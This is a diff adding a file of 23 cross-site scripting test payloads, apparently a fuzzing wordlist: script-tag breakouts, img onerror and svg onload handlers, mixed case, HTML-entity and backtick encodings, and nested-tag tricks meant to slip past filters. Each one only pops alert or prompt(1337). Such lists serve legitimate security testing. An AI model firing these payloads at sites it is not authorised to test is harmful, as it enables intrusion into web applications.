@@ -1,0 +1,23 @@
+</script>"><script>prompt(1337)</script>
+</ScRiPt>"><ScRiPt>prompt(1337)</ScRiPt>
+</script>"><script>alert(1337)</script>
+</ScRiPt>"><ScRiPt>alert(1337)</ScRiPt>
+<img src=x onerror=alert(1337)>
+<script>alert(1337)</script>
+"><img src=x onerror=alert(1337)>
+" onload=alert(1337)
+\"><img src=x onerror=alert(1337)>
+</script><svg/onload=alert(1337)>
+<body onload=alert(1337)>
+<svg onload=alert`1337`>
+<svg onload=alert&lpar;1337&rpar;>
+<svg onload=alert&#x28;1337&#x29>
+<svg onload=alert&#40;1337&#41>
+--!><svg/onload=prompt(1337)
+--><script>alert(1337)</script>
+&lt;script&gt;alert(&#39;1337&#39;);&lt;/script&gt;
+< / script >< script >alert(1337)< / script >
+<sc<script>ript>alert(1337)</sc</script>ript>
+<script\\x20type=\"text/javascript\">javascript:alert(1337);</script>
+'`\"><\\x3Cscript>javascript:alert(1337)</script>
+<<SCRIPT>alert(1337);//<</SCRIPT>
